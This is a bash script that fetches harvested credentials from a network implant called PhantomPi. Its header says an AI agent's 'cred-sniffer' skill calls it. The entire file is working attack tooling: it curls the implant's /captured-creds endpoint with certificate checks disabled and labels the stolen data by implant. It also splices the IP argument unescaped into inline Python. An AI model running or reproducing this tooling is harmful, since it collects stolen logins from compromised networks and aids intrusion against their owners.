#!/usr/bin/env bash
# -------------------------------------------------------------------
# Fetch captured credentials from a single PhantomPi implant.
# Called by the OpenClaw cred-sniffer skill.
#
# Usage:  bash check-findings.sh [IMPLANT_IP] [PORT]
# -------------------------------------------------------------------

set -euo pipefail

IMPLANT_IP="${1:-${IMPLANT_IPS:-10.8.0.3}}"
PORT="${2:-8443}"

RESPONSE=$(curl -sk --max-time 10 "https://${IMPLANT_IP}:${PORT}/captured-creds" 2>/dev/null || echo "")

if [ -z "$RESPONSE" ]; then
    echo "{\"implant\":\"${IMPLANT_IP}\",\"error\":\"unreachable\"}"
    exit 1
fi

# Tag response with the implant IP
echo "$RESPONSE" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    d['implant'] = '${IMPLANT_IP}'
    print(json.dumps(d))
except:
    print(json.dumps({'implant':'${IMPLANT_IP}','error':'bad response'}))
"
